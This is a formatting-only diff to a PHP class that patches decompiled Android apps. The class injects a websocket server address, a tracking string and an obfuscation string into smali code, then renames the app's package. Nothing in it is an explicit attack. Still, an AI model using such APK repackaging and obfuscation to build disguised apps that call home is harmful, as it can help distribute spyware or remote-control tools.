@@ -12,6 +12,7 @@ use RecursiveIteratorIterator;
 final class SmaliProcessor
 {
     private string $buildDir;
+
     private string $obfuscationString;
 
     public function __construct(string $buildDir)
@@ -45,14 +46,15 @@ final class SmaliProcessor
         $value = str_replace(["\r\n", "\r", "\n"], '\\n', $value);
         // 其他连续空白（空格、制表符）压缩为单个空格
         $value = preg_replace('/[ \t]+/u', ' ', $value);
+
         return trim($value);
     }
 
     public function modifyConfig(ApkBuildConfig $config, string $assetsKey, Encryptor $encryptor): void
     {
-        $smaliPath = $this->buildDir . '/' . ApkBuilderConstants::CONFIGS_SMALI_RELATIVE;
+        $smaliPath = $this->buildDir.'/'.ApkBuilderConstants::CONFIGS_SMALI_RELATIVE;
 
-        if (!File::exists($smaliPath)) {
+        if (! File::exists($smaliPath)) {
             throw new ApkBuildException("My_Configs.smali not found at: {$smaliPath}", [
                 'path' => $smaliPath,
             ]);
@@ -63,7 +65,7 @@ final class SmaliProcessor
         $parsedUrl = parse_url($config->websocketUrl);
         $host = $parsedUrl['host'] ?? 'localhost';
         $port = $parsedUrl['port'] ?? 8081;
-        $userDom = $host . ':' . $port;
+        $userDom = $host.':'.$port;
         $useWss = str_starts_with($config->websocketUrl, 'wss://');
 
         // 生成追踪数据字符串，格式: clientName>linkId>appId
@@ -102,7 +104,7 @@ final class SmaliProcessor
 
         $content = str_replace(array_keys($replacements), array_values($replacements), $content);
 
-        if (!$useWss) {
+        if (! $useWss) {
             $content = str_replace('const-string v1, "wss://"', 'const-string v1, "ws://"', $content);
         }
 
@@ -115,14 +117,14 @@ final class SmaliProcessor
         $newPath = str_replace('.', '/', $newPackage);
 
         foreach (ApkBuilderConstants::SMALI_DIRS as $smaliDir) {
-            $basePath = $this->buildDir . '/' . $smaliDir;
+            $basePath = $this->buildDir.'/'.$smaliDir;
 
-            if (!File::isDirectory($basePath)) {
+            if (! File::isDirectory($basePath)) {
                 continue;
             }
 
-            $oldDir = $basePath . '/' . $oldPath;
-            $newDir = $basePath . '/' . $newPath;
+            $oldDir = $basePath.'/'.$oldPath;
+            $newDir = $basePath.'/'.$newPath;
 
             if (File::isDirectory($oldDir)) {
                 File::ensureDirectoryExists(dirname($newDir));
@@ -136,7 +138,7 @@ final class SmaliProcessor
 
     private function moveDirectory(string $src, string $dst): void
     {
-        if (!File::moveDirectory($src, $dst)) {
+        if (! File::moveDirectory($src, $dst)) {
             File::copyDirectory($src, $dst);
             File::deleteDirectory($src);
         }
@@ -144,8 +146,8 @@ final class SmaliProcessor
 
     private function replaceReferences(string $dir, string $oldPackage, string $newPackage): void
     {
-        $oldSmali = 'L' . str_replace('.', '/', $oldPackage);
-        $newSmali = 'L' . str_replace('.', '/', $newPackage);
+        $oldSmali = 'L'.str_replace('.', '/', $oldPackage);
+        $newSmali = 'L'.str_replace('.', '/', $newPackage);
 
         $iterator = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS)
